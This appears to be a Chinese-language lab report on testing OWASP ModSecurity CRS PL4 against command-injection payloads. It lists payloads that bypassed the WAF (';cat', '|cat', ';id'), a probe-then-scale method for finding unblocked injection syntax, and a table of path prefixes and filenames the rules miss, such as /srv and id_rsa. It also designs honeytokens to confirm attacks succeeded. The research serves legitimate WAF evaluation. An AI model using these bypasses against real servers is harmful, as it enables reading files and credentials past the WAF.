# W1 完整报告：从 flag.txt 到 CRS 规则驱动的蜜标梯度矩阵

> 周期：第一周 | 靶场：OWASP ModSecurity CRS PL4 + PHP-Apache + MySQL

---

## 一、发现 WAF 盲区

批量攻击 CMDi 15 关，L1-L4 全部绕过 CRS PL4 拿到 flag：

```
;cat /flag.txt    → 200 绕过  flag{cmdi_l1_...}
|cat /flag.txt    → 200 绕过  flag{cmdi_l1_...}
||cat /flag.txt   → 200 绕过  flag{cmdi_l1_...}
```

追问：`cat` 为什么没被拦？分析 CRS REQUEST-932 RCE 规则发现，Unix 命令黑名单只有 `whoami`、`busybox`、`wget` 等侦察/后渗透工具，`cat` 不在其中——文件读取类命令不在 CRS 的 RCE 检测优先级里。

**核心问题**：`cat /flag.txt` 绕过 WAF 不能证明 WAF 弱。WAF 不认为读取一个叫 `flag.txt` 的无害文件是威胁。样本测试的是"WAF 对 CTF 玩具的检测能力"，不是对真实攻击意图的检测。

---

## 二、蜜标方案

### 核心矛盾

| 需求 | 冲突 |
|------|------|
| 需要唯一标记验证攻击成功 | 标记不能出现在 payload 中 |
| 攻击目标要模拟真实资产 | 但不能是真正的敏感文件 |
| 要覆盖多个攻击面 | 不能到处撒 flag |

### 设计

验证标记 `hp-[0-9a-f]{8}` 只嵌入目标内部，payload 使用真实资源路径：

```
payload:  ;cat /app/config/db.php          ← WAF 看到：攻击数据库配置
目标内容: define('DB_PASS', 'Kx9mP2vQ7w');  ← 像真实密码
          // deployment_id: hp-4f8a2c1b    ← 蜜标(嵌入注释)
```

`hp-` 前缀在自然语言中极少出现，8位 hex 足够唯一，可嵌入任何上下文。比 `flag{...}` 更像真实内部标记（deployment_id, access_key）。

### 分布式蜜标矩阵

每个攻击面一个独立 token，5 个文件蜜标 + 5 组 DB 蜜标，分散在不同敏感度层级。

---

## 三、正交矩阵 + 两阶段探测

### 设计

把"怎么打"(注入语法) 和 "打什么"(目标路径) 拆成独立维度：

```
               P0 系统文件     P1 应用配置      P2 无害路径
;cat           测              测               测
|cat           测              测               测
||cat          测              测               测
$(cat)         测              测               测
```

### 两阶段探测 (Probe-then-Scale)

**三角定位归因**——两个不同无害目标互相验证：

```
探针: ;id   → 放行
探针: ;env  → 放行
→ 两个不同命令都放行 → ; 语法干净 → 展开全矩阵

探针: $(id)  → 被拦
探针: $(env) → 被拦
→ 两个不同命令都被拦 → 拦的是 $() 语法 → 跳过该语法全矩阵
```

成本：10 种语法 × 2 探针 = 20 次，秒级完成。被拦语法直接跳过，节省 60%+ 测试量。

## 四、梯度是假的 → 探测真实 CRS 路径规则

### 问题

第一个矩阵全用项目目录 `/app/config/` ` /srv/config/`——WAF 全放行。梯度是我们自己编的标签，不是 WAF 的真实行为。

### CRS 规则分析

直接从 WAF 容器读取 CRS 规则文件，分析路径检测机制：

- **REQUEST-932 RCE**：Unix 命令黑名单（含 `whoami` `wget` `busybox`，不含 `cat`）
- **REQUEST-930 LFI**：路径穿越检测（`../` `.../`），无具体文件路径
- **REQUEST-933 PHP**：`php://filter` `expect://`

### 真实 Linux 路径词典探测

71 条真实 Linux 路径，用已验证绕过的 `;cat` 统一测试，只变路径：

| 路径类型 | 拦截率 | 触发规则 |
|---------|--------|---------|
| `/etc/*` | 100% | 系统路径前缀 |
| `/proc/*` `/sys/*` | 100% | 内核/系统前缀 |
| `/var/log/*` | 100% | 日志目录 |
| `/var/www/*` | 100% | Web 根目录 |
| `/tmp/*` `/root/*` `/home/*` | 100% | 临时/用户目录 |
| `/usr/share/*` | 0% | 安全路径 |
| `/srv/*` | 0% | 服务数据（盲区） |
| 纯文件名 (`.env` `id_rsa`) | 0% | 无私前缀，不触发 |

**结论**：CRS PL4 路径检测基于**路径前缀黑名单**，不是路径内容匹配。

## 五、基于 CRS 规则的真实梯度

### 新横轴

三档有 CRS 规则依据的梯度：

| 档位 | 路径 | WAF | 蜜标 | 触发层 |
|------|------|-----|------|--------|
| P0 | `/etc/motd` | 🛡️ 403 | `hp-d0e1f2a3` | Layer1: 路径前缀黑名单 |
| P0 | `/etc/hostname` | 🛡️ 403 | `hp-b4c5d6e7` | Layer1: 路径前缀黑名单 |
| P1 | `/srv/app/settings.json` | ✅ 200 | `hp-f8a9b0c1` | 前缀安全 + 文件名不触发 |
| P1 | `/srv/app/data.xml` | ✅ 200 | `hp-a1b2c3d4` | 前缀安全 + 文件名不触发 |
| P2 | `/srv/data/db.json` | ✅ 200 | `hp-f8a9b0c1` | 完全安全 |

P1 是梯度最有价值的设计——同一前缀 `/srv/app/` 下：
- `config.yml` → 403（文件名触发）
- `settings.json` → 200（不触发）

证明了 WAF 有独立的**文件名黑名单**（Layer2），与路径前缀黑名单（Layer1）正交。

## 六、无路径 payload 的验证

### 问题

`;id` `;whoami` 这类命令执行型 payload 不读文件、不接触蜜标，如何验证成功？

### 双验证体系

| | honeytoken 型 | output 型 |
|---|-------------|----------|
| Payload | `;cat /etc/motd` | `;id` |
| 验证方式 | 响应中匹配 `hp-[0-9a-f]{8}` | `<pre>` 标签中匹配关键字 |
| 需要蜜标？ | 是 | 否 |
| 适用 | 文件读取、DB 查询 | 侦察命令、命令执行 |

种子 JSON 里加 `verify_type` 和 `verify_pattern` 字段，传输层根据类型自动选择验证方式。

### 实际发现

| Payload | WAF | 原因 |
|---------|-----|------|
| `;id` | ✅ 200 | `id` 不在 CRS 命令黑名单 |
| `;whoami` | 🛡️ 403 | `whoami` 在 REQUEST-932 黑名单 |
| `;uname -a` | 🛡️ 403 | `uname` 在黑名单 |
| `;env` | 🛡️ 403 | 环境变量泄露检测 |

## 八、已确认的 CRS PL4 能力边界

### WAF 有效拦截

| 检测层 | 机制 | 效果 |
|--------|------|------|
| SQL 关键字 | 942 系列规则，UNION/SELECT/extractvalue | 100% 拦截 |
| 命令语法 | `$()` `${IFS}` 反引号 管道解码 | 100% 拦截 |
| 路径前缀 | `/etc/*` `/proc/*` `/var/*` `/tmp/*` | 100% 拦截 |
| 文件名 | `config.yml` `database.yml` `wp-config.php` | 文件名黑名单 |
| 高危命令 | `whoami` `uname` `wget` | 命令黑名单 |

### WAF 盲区

| 盲区 | 实例 | 原因 |
|------|------|------|
| 简单分隔符 | `;` `\|` `\|\|` `&&` | CRS 对分隔符的评分不够触发阈值 |
| 非黑名单命令 | `cat` `id` | 不在 REQUEST-932 命令黑名单 |
| 安全路径前缀 | `/srv/*` `/usr/share/*` | 不在路径黑名单 |
| 纯文件名(无路径) | `.env` `id_rsa` | 无私前缀不触发路径规则 |
